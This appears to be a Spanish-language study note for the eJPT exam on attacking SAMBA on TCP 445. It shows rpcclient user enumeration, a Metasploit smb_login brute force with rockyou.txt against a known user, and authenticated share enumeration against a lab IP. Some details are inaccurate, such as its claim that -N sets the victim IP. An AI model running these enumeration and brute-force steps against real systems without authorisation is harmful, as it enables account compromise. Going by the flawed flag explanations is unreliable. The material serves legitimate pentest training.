- El protocolo **SAMBA** corre por el puerto **TCP 445** (al igual que **SMB**), pero no es lo mismo que el protocolo **SMB**. El protocolo **SAMBA** sirve para que los **Sistemas Operativos** que no sean **Windows** (sobre todo **Linux**) puedan comunicarse y conectarse con los sistemas que utilizan **SMB (Windows)**.
- Si en el examen vemos una maquina **Linux** que utilice el protocolo **SAMBA** usaremos una herramienta llamada **Rpcclient** para enumerar usuarios existentes en el protocolo **SAMBA**.

1. Utilizamos la herramienta **Rpcclient** para encontrar usuarios en el protocolo **SAMBA** de la victima:
```
rpcclient -U "" -N 192.168.8.135
```
![Hacking al Protocolo SAMBA 2](ejpt/img/hacking-al-protocolo-samba-2.png)
- **-U**: El usuario que utilizaremos (no tenemos ningún usuario de momento).
- **-N**: IP de la victima.

2. Nos sale una consola de comandos de **Rpccclient**, estos son los 3 comandos que utilizaremos en la consola de comandos de **Rpcclient** para obtener usuarios e información:
```
srvinfo
querydispinfo
enumdomusers
```
![Hacking al Protocolo SAMBA 1](ejpt/img/hacking-al-protocolo-samba-1.png)
- **Normalmente con el segundo comando *("querydispinfo")* suelen salir algunos usuarios.**

3. Entramos a **Metasploit** para realizar **Fuerza Bruta** usando el modulo de **Fuerza Bruta** al puerto **TCP 445 (SAMBA y SMB)**:
```
use scanner/smb/smb_login
```
![Hacking al Protocolo SAMBA 3](ejpt/img/hacking-al-protocolo-samba-3.png)

4. Vemos la configuración del modulo:
```
show options
```
![Hacking al Protocolo SMB 10](ejpt/img/hacking-al-protocolo-smb-10.png)

5. Configuramos el **RHOSTS** (IP de la victima **Windows**):
```
set RHOSTS 192.168.8.135
```
![Hacking al Protocolo SAMBA 4](ejpt/img/hacking-al-protocolo-samba-4.png)

6. Quitamos el **Verbose** para que el ataque de **Fuerza Bruta** vaya mas rápido:
```
set VERBOSE false
```
![Hacking al Protocolo SMB 12](ejpt/img/hacking-al-protocolo-smb-12.png)

7. Introducimos el usuario que conocemos:
```
set SMBUSER ken
```
![Hacking al Protocolo SAMBA 5](ejpt/img/hacking-al-protocolo-samba-5.png)

8. Introducimos el diccionario con el que haremos **Fuerza Bruta**:
```
set PASS_FILE /usr/share/wordlists/rockyou.txt
```
![Hacking al Protocolo SMB 14](ejpt/img/hacking-al-protocolo-smb-14.png)

9. Vemos como ha quedado la configuración del modulo:
```
show options
```
![Hacking al Protocolo SAMBA 6](ejpt/img/hacking-al-protocolo-samba-6.png)

10. Iniciamos el modulo para empezar el ataque de **Fuerza Bruta**:
```
run
```
![Hacking al Protocolo SAMBA 7](ejpt/img/hacking-al-protocolo-samba-7.png)

11. Ahora podemos enumerar recursos compartidos de forma autentificada:
![Hacking al Protocolo SAMBA 8](ejpt/img/hacking-al-protocolo-samba-8.png)
![Hacking al Protocolo SAMBA 9](ejpt/img/hacking-al-protocolo-samba-9.png)
- **-r**: Para elegir el recurso compartido que quieres enumerar.